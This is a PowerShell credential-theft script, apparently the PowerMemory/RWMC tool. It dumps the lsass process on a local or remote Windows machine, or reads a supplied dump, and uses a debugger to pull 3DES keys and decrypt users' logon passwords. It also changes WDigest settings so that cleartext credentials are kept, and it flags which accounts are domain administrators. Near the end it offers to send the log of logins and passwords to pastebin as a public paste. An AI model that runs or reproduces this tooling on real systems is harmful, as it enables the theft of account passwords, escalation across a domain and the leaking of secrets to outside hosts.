#requires -version 3
<#

.SYNOPSIS         
    Reveal credentials from memory dump

.NOTES
    Version:        0.2
    Author:         Pierre-Alexandre Braeken
    Creation Date:  2015-05-01

.CREDITS
    Thanks to Benjamin Delpy for his work on mimikatz and Francesco Picasso (@dfirfpi) for his work on DES-X.

#>
Param
    (
        [Parameter(Position = 0)]        
        [String]
        $relaunched = 0
    )
#---------------------------------------------------------[Initialisations]--------------------------------------------------------
Set-StrictMode -version Latest

$scriptPath = split-path -parent $MyInvocation.MyCommand.Definition
$scriptFile = $MyInvocation.MyCommand.Definition
$launchDate = get-date -f "yyyyMMddHHmmss"
$logDirectoryPath = $scriptPath + "\" + $launchDate
$file = "$logDirectoryPath\lsass.dmp"
$buffer = "$scriptPath\bufferCommand.txt"
$fullScriptPath = (Resolve-Path -Path $buffer).Path

$loggingFunctions = "$scriptPath\logging\Logging.ps1"
$cryptoFunctions = "$scriptPath\utilities\Crypto.ps1"
$DESXFunctions = "$scriptPath\utilities\DESX.ps1"
$utilsFunctions = "$scriptPath\utilities\Utils.ps1"
$domainFunctions = "$scriptPath\utilities\Domain.ps1"
$vipFunctions = "$scriptPath\utilities\VIP.ps1"
$obsoleteSystemsFunctions = "$scriptPath\obsolete\Get-Them.ps1"

$partOfADomain = 0
$adFlag = 0
$osArchitecture = ""
$operatingSystem = ""
$server = ""
$elevate = 0
$dev_key = $null

#----------------------------------------------------------[Declarations]----------------------------------------------------------

$scriptName = [System.IO.Path]::GetFileName($scriptFile)
$scriptVersion = "0.2"

if(!(Test-Path $logDirectoryPath)) {
    New-Item $logDirectoryPath -type directory | Out-Null
}

$logFileName = "Log_" + $launchDate + ".log"
$logPathName = "$logDirectoryPath\$logFileName"

$global:streamWriter = New-Object System.IO.StreamWriter $logPathName

#-----------------------------------------------------------[Functions]------------------------------------------------------------

. $loggingFunctions
. $cryptoFunctions
. $DESXFunctions
. $utilsFunctions
. $domainFunctions
. $vipFunctions
. $obsoleteSystemsFunctions

#----------------------------------------------------------[Execution]----------------------------------------------------------

Start-Log -scriptName $scriptName -scriptVersion $scriptVersion -streamWriter $global:streamWriter
cls
Write-Host "================================================================================================"
White-Rabbit

# Prérequis
Test-InternetConnection

if($relaunched -eq 0) {
<#
    if(!(Test-IsInLocalAdministratorsGroup)) {
        $elevate = 1    
        Bypass-UAC $scriptPath $logDirectoryPath
    }
    else {    #>
$adminFlag = Test-LocalAdminRights
if($adminFlag -eq $false){        
    Write-Host "You have to launch this script with " -nonewline; Write-Host "local Administrator rights!" -f Red    
    $scriptPath = Split-Path $MyInvocation.InvocationName   
    $RWMC = $scriptPath + "\RWMC.ps1 1"     
    $ArgumentList = 'Start-Process -FilePath powershell.exe -ArgumentList \"-ExecutionPolicy Bypass -File "{0}"\" -Verb Runas' -f $RWMC;
    Start-Process -FilePath powershell.exe -ArgumentList $ArgumentList -Wait -NoNewWindow;    
    Stop-Script
}    
    #}
}
Write-Host "================================================================================================"
$activeDirectoryOrNot = Read-Host 'Do you want use Active Directory cmdlets ?
1) Yes
2) No
0) Exit

Enter menu number and press <ENTER>'
switch ($activeDirectoryOrNot){
    "1" {$adFlag = 1}
    "2" {$adFlag = 0}
    "Yes" {$adFlag = 1}
    "No" {$adFlag = 0}
    "Y" {$adFlag = 1}
    "N" {$adFlag = 0}
    "0" {Stop-Script}    
    default {Write-Output "The option could not be determined... Active Directory cmdlets will be not used";$adFlag = "0"}
}

$remoteLocalFile = Read-Host 'Local computer, Remote computer or from a dump file ?
1) Local
2) Remote
3) Dump
0) Exit

Enter menu number and press <ENTER>'
switch ($remoteLocalFile){
    "1" {$dump = "gen"}
    "2" {$dump = "remote"}
    "3" {$dump = "dump"}
    "0" {Stop-Script}
    "m" {cls;White-MakeMeASandwich;Stop-Script}
    default {Write-Output "The option could not be determined... generate local dump"}
}

Set-ActiveDirectoryInformations $adFlag

if($dump -eq "dump") {
    $dump = Read-Host 'Enter the path of your lsass process dump'
    $mode = Read-Host 'Mode (1 (Win 7 and 2008r2), 132 (Win 7 32 bits), 2 (Win 8 and 2012), 2r2 (Win 10 and 2012r2), 232 (Win 10 32 bits) 8.1 (Win 8.1) or 3 (Windows 2003))?'
    switch ($mode){
        1 {Write-Output "Try to reveal password for Windows 7 or 2008r2"}
        132 {Write-Output "Try to reveal password for Windows 7 32bits"}
        2 {Write-Output "Try to reveal password for Windows 8 or 2012"}
        "2r2" {Write-Output "Try to reveal password for Windows 10 or 2012r2"}
        "232" {Write-Output "Try to reveal password for Windows 10 32 bits"}
        "8.1" {Write-Output "Try to reveal password for Windows 8.1"}
        3 {Write-Output "Try to reveal password for Windows XP or 2003"}
        default {
                Write-Output "The mode could not be determined... terminating"
                Stop-Script
        }
    }
}
else {
    if($dump -eq "remote") { 
        $dump = ""
        $server = Read-Host 'Enter the name of the remote server'
        $operatingSystem = (Get-WmiObject Win32_OperatingSystem -ComputerName $server).version
        $osArchitecture =  (Get-WmiObject Win32_OperatingSystem -ComputerName $server).OSArchitecture
    }
    else {
        if($dump -eq "gen") { 
            $operatingSystem = (Get-WmiObject Win32_OperatingSystem).version
            $osArchitecture =  (Get-WmiObject Win32_OperatingSystem).OSArchitecture
        }
    }
    if($operatingSystem -eq "5.1.2600" -or $operatingSystem -eq "5.2.3790"){
        $mode = 3
    }
    else {
        if($operatingSystem -eq "6.1.7601" -or $operatingSystem -eq "6.1.7600"){
            if($osArchitecture -eq "64 bits" -or $osArchitecture -eq "64-bit") {
                $mode = 1
            }
            else {
                $mode = 132
            }
        }
        else {
            if($operatingSystem -eq "6.2.9200"){
                $mode = 2
            }
            else{
                if($operatingSystem -eq "6.3.9600" -or $operatingSystem -eq "10.0.10240" -or $operatingSystem -eq "10.0.10514"){        
                    if($osArchitecture -eq "64 bits" -or $osArchitecture -eq "64-bit") {                
                        $mode = "2r2"
                    }
                    else {
                        $mode = "232"
                    }
                }
                else {
                    Write-Output "The operating system could not be determined... terminating..."
                    Stop-Script 
                }
            }
        }
    }
}

$exFiltrate = Read-Host 'Do you want exfiltrate the data (pastebin) ?
1) Yes
2) No
0) Exit

Enter menu number and press <ENTER>'
switch ($exFiltrate){
    "1" {$exFiltrate = 1}
    "2" {$exFiltrate = 0}
    "Yes" {$exFiltrate = 1}
    "No" {$exFiltrate = 0}
    "Y" {$exFiltrate = 1}
    "N" {$exFiltrate = 0}
    "0" {Stop-Script}    
    default {Write-Output "The option could not be determined... Exfiltration will be not used";$exFiltrate = "0"}
}
if($exFiltrate -eq 1) {
    $devKey = Read-Host 'What is your dev_key API (pastebin) ?

    Enter your dev_key and press API <ENTER>'

    $dev_key = $devKey
}

if($mode -eq "2r2" -or $mode -eq "232") {
    if($mode -eq "2r2") {
        $memoryWalker = "$scriptPath\debugger\2r2\cdb.exe"
    }
    else {
        $memoryWalker = "$scriptPath\debugger\pre2r2\cdb.exe"
    }
    if($dump -eq "" -or $dump -eq "gen") {
        Set-WdigestProvider
    }
    else {
        if(![string]::IsNullOrEmpty($server)){
            Set-RemoteWdigestProvider $server
        }
    }
}
else {
    $memoryWalker = "$scriptPath\debugger\pre2r2\cdb.exe"
}

Write-Progress -Activity "Setting environment" -status "Running..." -id 1
Set-SymbolServer -CacheDirectory C:\symbols\public -Public -SymbolServers http://msdl.microsoft.com/download/symbols -CurrentEnvironmentOnly
Write-Progress -Activity "Environment setted" -status "Running..." -id 1
Write-Progress -Activity "Creating msdsc log" -status "Running..." -id 1

if($dump -eq "gen"){
    if($mode -eq "2r2") {
        $dumpAProcessPath = "$scriptPath\msdsc.exe"
        &$dumpAProcessPath "lsass" "$logDirectoryPath"
    }
    else {
        if($elevate -eq 0) {
            $process = Get-Process lsass 
            Write-Minidump $process $logDirectoryPath                
        }
    }
}
else {
    if($dump -eq ""){
        $computername = $server
        # To disable UAC remote (need a reboot)        
        # Disable-UAC $server       
        Remote-Dumping $computername $scriptPath $logDirectoryPath        
    }
    else {
        $file = $dump
    }
}

if($mode -eq 1 -or $mode -eq 132 -or $mode -eq 2 -or $mode -eq "2r2" -or $mode -eq "232") {    
    $chain = White-Rabbit1    
    Write-InFile $buffer $chain    
    $tab = Call-MemoryWalker $memoryWalker $file $fullScriptPath       
    $chain42 = White-Rabbit42
    $tabFA = ($tab -split ' ')                
    $fi = [array]::indexof($tabFA,$chain42) + 4
    $part1 = $tabFA[$fi]    
    $fi = [array]::indexof($tabFA,$chain42) + 5
    $part2 = $tabFA[$fi]    
    $final = "$part2$part1"            
    $chain = "$chain42 $final"    
    Write-InFile $buffer $chain      
    $chain2 = White-Rabbit2  
    $tab = Call-MemoryWalker $memoryWalker $file $fullScriptPath        
    $sa = Clean-String $tab $mode
    $command = "$chain2 $sa"    
    Write-InFile $buffer $command 
    $tab = &$memoryWalker -z $file -c "`$`$<$fullScriptPath;Q"                      
    $tabSplitted = ($tab -split ' ')         
    if($mode -eq 1) { $start = 20}
    if($mode -eq 2) { $start = 30}
    if($mode -eq "2r2") { $start = 40}    
    if($mode -eq "232") { $start = 38}    
    $j = 0
    $keyAddress = ""
    while($j -le 11) {
        if($j -eq 0) {
            $value = $start
            $comma = ""
        }
        else { 
            if($mode -eq 232) {
                if($j -eq 4) {
                    $value = $value+3
                    $comma = ", "
                }
                else {
                    $value++
                    $comma = ", "
                }
            }
            else {
                if($j -eq 2 -or $j -eq 10) {
                    $value = $value+3
                    $comma = ", "
                }
                else {
                    $value++
                    $comma = ", "
                }
            }
        }        
        $fi = [array]::indexof($tabSplitted,$chain2) + $value
        $keyAddress2 = $tabSplitted[$fi].Substring(0,2)
        $keyAddress1 = $tabSplitted[$fi].Substring(2,2)           
        $keyAddress += "$comma"+"0x$keyAddress1, 0x$keyAddress2"        
        $j++
    }        
    $keyToGet = $keyAddress               
    $chain = White-Rabbit3
    Write-InFile $buffer $chain    
    $tab = Call-MemoryWalker $memoryWalker $file $fullScriptPath       
    $tabf = ($tab -split ' ')    
    $fi = [array]::indexof($tabf,$chain42) + 4
    $firstAddress1 = $tabf[$fi]    
    $fi = [array]::indexof($tabf,$chain42) + 5
    $firstAddress2 = $tabf[$fi]    
    $firstAddress = "$firstAddress2$firstAddress1"            
    $chain = "$chain42 $firstAddress" 
    Write-InFile $buffer $chain             
    $tab = Call-MemoryWalker $memoryWalker $file $fullScriptPath     
    $arraySecondAddress = ($tab -split ' ')  
    if($mode -eq 232) { 
        $fi = [array]::indexof($arraySecondAddress,$chain42) + 7
        $secondAddress = $arraySecondAddress[$fi]    
    }
    else {
        $fi = [array]::indexof($arraySecondAddress,$chain42) + 10
        $secondAddress1 = $arraySecondAddress[$fi]    
        $fi = [array]::indexof($arraySecondAddress,$chain42) + 11
        $secondAddress2 = $arraySecondAddress[$fi]    
        $secondAddress = "$secondAddress2$secondAddress1"  
    }             
    $chain = "$chain2 $secondAddress" 
    Write-InFile $buffer $chain         
    $tab = Call-MemoryWalker $memoryWalker $file $fullScriptPath     
    $ata = ($tab -split ' ')      
    if($mode -eq 1) { $start = 20}
    if($mode -eq 2) { $start = 30}    
    if($mode -eq 232) { $start = 38}
    $j = 0
    $keyAddress = ""
    while($j -le 7) {
        if($j -eq 0) {
            $value = $start
            $comma = ""
        }
        else {        
            if($mode -eq 232) {
                if($j -eq 4) {
                    $value = $value+3
                    $comma = ", "
                }
                else {
                    $value++
                    $comma = ", "
                }
            }
            else {
                if($j -eq 2) {
                    $value = $value+3
                    $comma = ", "
                }
                else {
                    $value++
                    $comma = ", "
                }
            }
        }
        $fi = [array]::indexof($ata,"$chain2") + $value
        $keyAddress2 = $ata[$fi].Substring(0,2)
        $keyAddress1 = $ata[$fi].Substring(2,2)           
        $keyAddress += "$comma"+"0x$keyAddress1, 0x$keyAddress2"        
        $j++
    }        
    $keyToGet2 = $keyAddress      
    $chain = White-Rabbit4           
    Write-InFile $buffer $chain         
    $iv = Call-MemoryWalker $memoryWalker $file $fullScriptPath                  
    $tab = ($iv -split ' ')        
    if($mode -eq 1 -or $mode -eq 132) { $start = 20}
    if($mode -eq 2) { $start = 30}
    $j = 0
    $iva = ""
    $start = 4
    while($j -le 7) {
        if($j -eq 0) {
            $value = $start
            $comma = ""
        }
        else {        
            $value++
            $comma = ", "        
        }
        $fi = [array]::indexof($tab,"db") + $value   
        if($j -eq 7) {
            $iva1 = $tab[$fi].Substring(0,2)
        }
        else {
            $iva1 = $tab[$fi]
        }
        $iva += "$comma"+"0x$iva1"
        $j++
    }   
    $ivHex = $iva                    
    $chain = White-RabbitOrWhat
    Write-InFile $buffer $chain         
    $tab = Call-MemoryWalker $memoryWalker $file $fullScriptPath   
    $firstAddress = ""
    $tabf = ($tab -split ' ')    
    if($mode -eq 132 -or $mode -eq 232) {
        $fi = [array]::indexof($tabf,$chain42) + 4
        $firstAddress1 = $tabf[$fi]
        $firstAddress = "$firstAddress1" 
    }
    else {
        $fi = [array]::indexof($tabf,$chain42) + 4
        $firstAddress1 = $tabf[$fi]
        $fi = [array]::indexof($tabf,$chain42) + 5
        $firstAddress2 = $tabf[$fi]    
        $firstAddress = "$firstAddress2$firstAddress1" 
    }    
    $firstAddressList = $firstAddress
    $nextEntry = ""
    $i = 0
    while ($firstAddressList -ne $nextEntry) {
        if($i -eq 0) {
            $nextEntry = $firstAddress            
            $command = "$chain42 $firstAddress"
        }
        else {            
            $command = "$chain42 $nextEntry"
        }          
        Write-InFile $buffer $command         
        $ddSecond = Call-MemoryWalker $memoryWalker $file $fullScriptPath      
        if($mode -eq 132 -or $mode -eq 232) {
            if($i -eq 0) {
                $firstAddress = $firstAddress                                                 
            }
            else {        
                $firstAddress = $nextEntry                         
            }   
            $tab = ($ddSecond -split ' ')    
            $fi = [array]::indexof($tab,$chain42) + 4
            $nextEntry1 = $tab[$fi]        
            $nextEntry = "$nextEntry1" 
        }
        else {
            if($i -eq 0) {
                $firstAddress = $firstAddress                                                 
            }
            else {        
                $firstAddress = $nextEntry                
            } 
            $tab = ($ddSecond -split ' ')    
            $fi = [array]::indexof($tab,$chain42) + 4
            $nextEntry1 = $tab[$fi]     
            $fi = [array]::indexof($tab,$chain42) + 5
            $nextEntry2 = $tab[$fi]    
            $nextEntry = "$nextEntry2$nextEntry1" 
        }           
        Write-Progress -Activity "Getting valuable informations" -status "Running..." -id 1        
        $tab = ($ddSecond -split ' ')           
        if($mode -eq 1) { $start = 48}
        if($mode -eq 132 -or $mode -eq 232) { $start = 17}
        if($mode -eq 2 -or $mode -eq "2r2") { $start = 24}         
        $fi = [array]::indexof($tab,$chain42) + $start
        $la1 = $tab[$fi] 
        $fi = [array]::indexof($tab,$chain42) + $start + 1
        $la2 = $tab[$fi]    
        $la = "$la2$la1"                                           
        if($la -eq "0000000000000000"){
            $start = 24
            $fi = [array]::indexof($tab,$chain42) + $start
            $la1 = $tab[$fi]       
            $fi = [array]::indexof($tab,$chain42) + $start + 1
            $la2 = $tab[$fi]      
            $la = "$la2$la1"                                                    
        }          
        $tu = White-RabbitOK        
        $chain = "$tu $la"      
        Write-InFile $buffer $chain         
        $loginDB = Call-MemoryWalker $memoryWalker $file $fullScriptPath      
        $tab = ($loginDB -split ' ')            
        $fi = [array]::indexof($tab,"du") + 4
        $loginPlainText1 = $tab[$fi]
        $loginPlainText = $loginPlainText1 -replace """",""                                     
        if (($partOfADomain -eq 1) -and ($adFlag -eq 1)) {
            $user = ""
            if(![string]::IsNullOrEmpty($loginPlainText)) {
	            $user = Get-ADUser -Filter {UserPrincipalName -like $loginPlainText -or sAMAccountName -like $loginPlainText}
	            if(![string]::IsNullOrEmpty($user)) {
	                $user = $user.DistinguishedName   
	                $enterpriseAdminsFlag = "false"
	                $schemaAdminsFlag = "false"
	                $domainAdminFlag = "false"
	                $administratorsFlag = "false"
	                $backupOperatorsFlag = "false"
	                if($enterpriseAdmins -ne ""){
	                    $enterpriseAdminsFlag = $enterpriseAdmins.Contains($user)
	                    if($enterpriseAdminsFlag -eq "true") {$loginPlainText = $loginPlainText + " = Enterprise Admins"}
	                }
	                if($schemaAdmins -ne ""){
	                    $schemaAdminsFlag = $schemaAdmins.Contains($user)
	                    if($schemaAdminsFlag -eq "true") {$loginPlainText = $loginPlainText + " = Schema Admins"}
	                }
	                $domainAdminFlag = $domainAdmins.Contains($user)
	                if($domainAdminFlag -eq "true") {$loginPlainText = $loginPlainText + " = Domain Admin"}
	                $administratorsFlag = $administrators.Contains($user)
	                if($administratorsFlag -eq "true") {$loginPlainText = $loginPlainText + " = Administrators"}
	                $backupOperatorsFlag = $backupOperators.Contains($user)
	                if($backupOperatorsFlag -eq "true") {$loginPlainText = $loginPlainText + " = Backup Operators"}            
	            }
            }
        }        
        Write-Progress -Activity "Getting valuable informations.." -status "Running..." -id 1         
        $tab = ($ddSecond -split ' ')    
        if($mode -eq 132 -or $mode -eq 232) { $start = 22}
        else {$start = 34}
        $fi = [array]::indexof($tab,$chain42) + $start
        $lp = $tab[$fi]
        $lp = $lp.Substring(6,2)            
        $numberBytes = [int][Math]::Ceiling([System.Convert]::ToInt32($lp,16)/8) * 4            
        if($mode -eq 132 -or $mode -eq 232) {
            $fi = [array]::indexof($tab,$chain42) + 23
            $secondAddress1 = $tab[$fi]     
            $secondAddress = "$secondAddress1" 
        }
        else {
            $fi = [array]::indexof($tab,$chain42) + 36
            $secondAddress1 = $tab[$fi]  
            $fi = [array]::indexof($tab,$chain42) + 37
            $secondAddress2 = $tab[$fi]    
            $secondAddress = "$secondAddress2$secondAddress1"        
        }        
        $secondAddressCommand = "$chain2 $secondAddress"  
        Write-InFile $buffer $secondAddressCommand         
        $tab = Call-MemoryWalker $memoryWalker $file $fullScriptPath                                 
        $tabSplitted = ($tab -split ' ')                  
        $pa11 = ""
        $pa2 = ""
        $j = 1
        $modJ = $j
        $begin = 4
        $stringP = ""
        while($j -le $numberBytes -and $j -le 64) {        
            if($j -eq 1) {
                $value = $begin
                $comma = ""
            }
            else {
                $goNextLine = $modJ%9            
                if($goNextLine -eq 0) {
                    $value = $value+3
                    $comma = ", "
                    $modJ++
                }
                else {
                    $value++
                    $comma = ", "
                }
            }
            $fi = [array]::indexof($tabSplitted,"$chain2") + $value                
            $pa2 = $tabSplitted[$fi].Substring(0,2)
            $pa1 = $tabSplitted[$fi].Substring(2,2)            
            $stringP += "$comma"+"0x$pa1, 0x$pa2"
            $j++
            $modJ++
        }        
        $pHex = $stringP                            
        Write-Log -streamWriter $global:streamWriter -infoToLog "Login : $loginPlainText"           
        if(($numberBytes % 8)) {        
            #$password = Get-DecryptAESPassword $pHex $keyToGet2 $ivHex
            $password = Get-DecryptTripleDESPassword $pHex $keyToGet $ivHex
        }
        else {        
            $password = Get-DecryptTripleDESPassword $pHex $keyToGet $ivHex
        }        
        Write-Log -streamWriter $global:streamWriter -infoToLog "Password : $password"
        $i++
    }
}
else {    
    Get-ObsoleteSystemsInformations $buffer $fullScriptPath 
}
Write-Progress -Activity "Removing symbols" -status "Running..." -id 1 
Remove-Item -Recurse -Force c:\symbols
Write-Progress -Activity "Write informations in the log file" -status "Running..." -id 1
End-Log -streamWriter $global:streamWriter
notepad $logPathName

if($exFiltrate -eq 1 -and ![string]::IsNullOrEmpty($dev_key)) {    
    Write-Progress -Activity "Exfiltrate" -status "Running..." -id 1 
    $dataToExfiltrate = Get-Content $logPathName
    $utfEncodedBytes  = [System.Text.Encoding]::UTF8.GetBytes($dataToExfiltrate)
    $pasteValue = [System.Convert]::ToBase64String($utfEncodedBytes)
    $pasteName = "PowerMemory (Follow the White Rabbit)"    
    $url = "https://pastebin.com/api/api_post.php"
    $parameters = "&api_option=paste&api_dev_key=$dev_key&api_paste_name=$pasteName&api_paste_code=$pasteValue&api_paste_private=0" 
    Post-HttpRequest $url $parameters
}
cls